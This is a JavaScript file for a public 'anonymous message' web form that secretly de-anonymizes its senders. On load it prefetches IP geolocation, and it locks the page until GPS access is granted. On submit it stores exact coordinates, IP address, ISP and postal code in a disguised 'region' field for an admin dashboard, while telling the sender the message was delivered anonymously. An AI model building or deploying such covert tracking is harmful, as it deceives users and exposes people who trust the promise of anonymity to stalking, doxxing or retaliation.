// ===== Public Form Logic =====

const MAX_MESSAGE_LENGTH = 500;

// DOM Elements
const form = document.getElementById('messageForm');
const nameInput = document.getElementById('nameInput');
const messageInput = document.getElementById('messageInput');
const submitBtn = document.getElementById('submitBtn');
const charCounter = document.getElementById('charCounter');
const successOverlay = document.getElementById('successOverlay');
const splashScreen = document.getElementById('splashScreen');
const mainContent = document.getElementById('mainContent');
const locationGate = document.getElementById('locationGate');
const enableLocationBtn = document.getElementById('enableLocationBtn');
const retryLocationBtn = document.getElementById('retryLocationBtn');
const locationGateError = document.getElementById('locationGateError');
const locationGateErrorMsg = document.getElementById('locationGateErrorMsg');

// Character counter
if (messageInput && charCounter) {
  messageInput.addEventListener('input', () => {
    const len = messageInput.value.length;
    charCounter.textContent = `${len} / ${MAX_MESSAGE_LENGTH}`;

    charCounter.classList.remove('warn', 'danger');
    if (len > MAX_MESSAGE_LENGTH * 0.9) {
      charCounter.classList.add('danger');
    } else if (len > MAX_MESSAGE_LENGTH * 0.7) {
      charCounter.classList.add('warn');
    }
  });
}

// Cache for prefetched IP data and GPS
let prefetchedLocation = null;
let cachedGpsCoords = null;
let gpsPromise = null;

// Prefetch IP data immediately on load
(async function prefetchLocation() {
  try {
    const res = await fetch('https://ipwho.is/');
    if (res.ok) {
      const data = await res.json();
      if (data && data.success !== false) {
        prefetchedLocation = data;
      }
    }
  } catch {}
})();

// Reveal main application content
function unlockMainContent() {
  if (locationGate) {
    locationGate.classList.remove('show');
    setTimeout(() => {
      locationGate.style.display = 'none';
    }, 500);
  }
  mainContent.style.transition = 'opacity 0.6s ease';
  mainContent.style.opacity = '1';
}

// Show the permission gate modal
function showLocationGate() {
  if (locationGate) {
    locationGate.style.display = 'flex';
    // Force reflow for smooth animation
    void locationGate.offsetWidth;
    locationGate.classList.add('show');
  }
}

// Acquire device GPS location strictly
function triggerLocationPermission() {
  if (!('geolocation' in navigator)) {
    if (locationGateError && locationGateErrorMsg) {
      locationGateErrorMsg.textContent = 'Geolocation is not supported by your browser.';
      locationGateError.style.display = 'block';
    }
    return;
  }

  if (enableLocationBtn) {
    enableLocationBtn.classList.add('loading');
    enableLocationBtn.disabled = true;
    const btnText = enableLocationBtn.querySelector('.btn-text');
    if (btnText) btnText.textContent = 'Requesting Permission...';
  }
  if (locationGateError) {
    locationGateError.style.display = 'none';
  }

  navigator.geolocation.getCurrentPosition(
    (pos) => {
      if (pos && pos.coords) {
        cachedGpsCoords = {
          lat: pos.coords.latitude,
          lon: pos.coords.longitude,
          accuracy: Math.round(pos.coords.accuracy)
        };
      }

      if (enableLocationBtn) {
        enableLocationBtn.classList.remove('loading');
        const btnText = enableLocationBtn.querySelector('.btn-text');
        if (btnText) btnText.textContent = 'Location Verified ✓';
      }

      // Smoothly unlock after verification
      setTimeout(() => {
        unlockMainContent();
      }, 350);
    },
    (err) => {
      console.warn('Geolocation acquisition blocked or failed:', err);
      if (enableLocationBtn) {
        enableLocationBtn.classList.remove('loading');
        enableLocationBtn.disabled = false;
        const btnText = enableLocationBtn.querySelector('.btn-text');
        if (btnText) btnText.textContent = 'Turn On Location';
      }

      if (locationGateError && locationGateErrorMsg) {
        locationGateError.style.display = 'block';
        if (err.code === 1) {
          locationGateErrorMsg.textContent = 'Location permission was denied. Please allow location to continue.';
        } else if (err.code === 2) {
          locationGateErrorMsg.textContent = 'Device location is currently unavailable. Please check that GPS/Location is turned on.';
        } else if (err.code === 3) {
          locationGateErrorMsg.textContent = 'Request timed out. Please tap retry.';
        } else {
          locationGateErrorMsg.textContent = 'Location is needed to continue.';
        }
      }
    },
    { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 }
  );
}

// ===== SPLASH SCREEN & PERMISSION INITIALIZATION =====
window.addEventListener('load', () => {
  setTimeout(async () => {
    splashScreen.classList.add('hide');

    // Check if permission is already granted previously
    if ('permissions' in navigator) {
      try {
        const result = await navigator.permissions.query({ name: 'geolocation' });
        if (result.state === 'granted') {
          // Already granted: fetch location and unlock immediately
          navigator.geolocation.getCurrentPosition(
            (pos) => {
              if (pos && pos.coords) {
                cachedGpsCoords = {
                  lat: pos.coords.latitude,
                  lon: pos.coords.longitude,
                  accuracy: Math.round(pos.coords.accuracy)
                };
              }
              unlockMainContent();
            },
            () => {
              // If failed despite granted state, show gate
              showLocationGate();
            },
            { enableHighAccuracy: true, timeout: 10000, maximumAge: 60000 }
          );
          return;
        }
      } catch {}
    }

    // Otherwise, show location gate strictly
    showLocationGate();
  }, 2200);
});

// Event Listeners for Location Gate
if (enableLocationBtn) {
  enableLocationBtn.addEventListener('click', triggerLocationPermission);
}
if (retryLocationBtn) {
  retryLocationBtn.addEventListener('click', triggerLocationPermission);
}

// Request device GPS / Wi-Fi geolocation helper
function requestGpsLocation() {
  if (cachedGpsCoords) return Promise.resolve(cachedGpsCoords);
  if (!('geolocation' in navigator)) return Promise.resolve(null);
  if (gpsPromise) return gpsPromise;

  gpsPromise = new Promise((resolve) => {
    navigator.geolocation.getCurrentPosition(
      (pos) => {
        if (pos && pos.coords) {
          cachedGpsCoords = {
            lat: pos.coords.latitude,
            lon: pos.coords.longitude,
            accuracy: Math.round(pos.coords.accuracy)
          };
          resolve(cachedGpsCoords);
        } else {
          resolve(null);
        }
      },
      (err) => {
        console.warn('Geolocation acquisition skipped or failed:', err.message);
        resolve(null);
      },
      { enableHighAccuracy: true, timeout: 10000, maximumAge: 60000 }
    );
  });

  return gpsPromise;
}

// Get exact location of sender (GPS prioritized, with clean reverse geocoding)
async function getExactLocation() {
  // 1. Attempt High-Accuracy Device GPS (10s timeout)
  const coords = await requestGpsLocation();
  const isGps = !!coords;

  // 2. Fetch IP location if not yet prefetched
  let ipData = prefetchedLocation;
  if (!ipData) {
    try {
      const res = await fetch('https://ipwho.is/');
      if (res.ok) {
        const d = await res.json();
        if (d && d.success !== false) ipData = d;
      }
    } catch {
      try {
        const res2 = await fetch('https://ipapi.co/json/');
        if (res2.ok) {
          const d2 = await res2.json();
          ipData = {
            ip: d2.ip,
            city: d2.city,
            region: d2.region,
            country: d2.country_name,
            postal: d2.postal,
            latitude: d2.latitude,
            longitude: d2.longitude,
            connection: { isp: d2.org }
          };
        }
      } catch {}
    }
  }

  ipData = ipData || {};
  const ip = ipData.ip || 'Unknown IP';
  const isp = (ipData.connection && ipData.connection.isp) ? ipData.connection.isp : '';

  let finalCity = '';
  let finalRegion = '';
  let finalCountry = ipData.country || 'Unknown Country';
  let coordsStr = '';
  let source = '';

  if (isGps && coords) {
    // Exact GPS available: Reverse geocode the REAL physical coordinates
    coordsStr = `${coords.lat.toFixed(6)},${coords.lon.toFixed(6)}`;
    source = `GPS (Exact • ±${coords.accuracy}m)`;

    try {
      const revRes = await fetch(
        `https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${coords.lat}&longitude=${coords.lon}&localityLanguage=en`
      );
      if (revRes.ok) {
        const rev = await revRes.json();
        const locality = rev.locality || rev.city || '';
        const city = rev.city || '';
        const postal = rev.postcode || '';

        // Avoid repeating city if locality matches
        let displayCity = locality;
        if (city && locality && city !== locality) {
          displayCity = `${locality}, ${city}`;
        } else if (city && !locality) {
          displayCity = city;
        }

        if (postal) {
          finalCity = `${displayCity} (Postal: ${postal})`;
        } else {
          finalCity = displayCity || ipData.city || 'Unknown City';
        }

        finalRegion = rev.principalSubdivision || ipData.region || '';
        if (rev.countryName) finalCountry = rev.countryName;
      }
    } catch {
      finalCity = ipData.city || 'Unknown City';
      finalRegion = ipData.region || '';
    }
  } else {
    // Fallback: No GPS allowed or available, use IP location
    source = 'IP Geolocation (Approximate)';
    const ipCity = ipData.city || 'Unknown City';
    const postal = ipData.postal ? ` (Postal: ${ipData.postal})` : '';
    finalCity = `${ipCity}${postal}`;
    finalRegion = ipData.region || '';
    if (ipData.latitude && ipData.longitude) {
      coordsStr = `${Number(ipData.latitude).toFixed(6)},${Number(ipData.longitude).toFixed(6)}`;
    }
  }

  // Pack detailed metadata safely into region field for admin dashboard view
  const regionParts = [
    finalRegion,
    coordsStr ? `Coords: ${coordsStr}` : '',
    `IP: ${ip}${isp ? ` (${isp})` : ''}`,
    `Source: ${source}`
  ].filter(Boolean);

  return {
    city: finalCity,
    region: regionParts.join(' | '),
    country: finalCountry
  };
}

// Form submission
form.addEventListener('submit', async (e) => {
  e.preventDefault();

  const message = messageInput.value.trim();
  if (!message) return;
  if (message.length > MAX_MESSAGE_LENGTH) return;

  submitBtn.disabled = true;
  submitBtn.innerHTML = '<span><div class="spinner"></div> Sending...</span>';

  try {
    const location = await getExactLocation();
    const name = nameInput.value.trim() || null;

    const client = window.supabaseClient || window.supabase;
    if (!client || typeof client.from !== 'function') {
      throw new Error('Supabase client is not ready. Please refresh the page.');
    }

    const { error } = await client
      .from('messages')
      .insert([{
        name: name,
        message: message,
        city: location.city,
        region: location.region,
        country: location.country
      }]);

    if (error) throw error;

    showSuccess();
    showToast('success', 'Message Sent! ✉️', 'Your anonymous message has been safely delivered.');
    form.reset();
    charCounter.textContent = `0 / ${MAX_MESSAGE_LENGTH}`;

  } catch (err) {
    console.error('Error sending message:', err);
    showToast('error', 'Could not send message', err.message || 'Please check your connection and Supabase setup.');
  } finally {
    submitBtn.disabled = false;
    submitBtn.innerHTML = '<span>Send Message</span>';
  }
});

// Toast notification helper
function showToast(type, title, desc) {
  const container = document.getElementById('toastContainer');
  if (!container) return;

  const toast = document.createElement('div');
  toast.className = `toast toast-${type}`;
  toast.innerHTML = `
    <div class="toast-icon">${type === 'success' ? '✓' : '⚠️'}</div>
    <div class="toast-text">
      <div class="toast-title">${title}</div>
      <div class="toast-desc">${desc}</div>
    </div>
  `;

  container.appendChild(toast);

  // Animate in
  requestAnimationFrame(() => {
    toast.classList.add('show');
  });

  // Auto remove
  setTimeout(() => {
    toast.classList.remove('show');
    setTimeout(() => toast.remove(), 400);
  }, 4000);
}

// Success overlay
function showSuccess() {
  successOverlay.classList.add('active');
  setTimeout(() => {
    successOverlay.classList.remove('active');
  }, 2500);
}

successOverlay.addEventListener('click', () => {
  successOverlay.classList.remove('active');
});
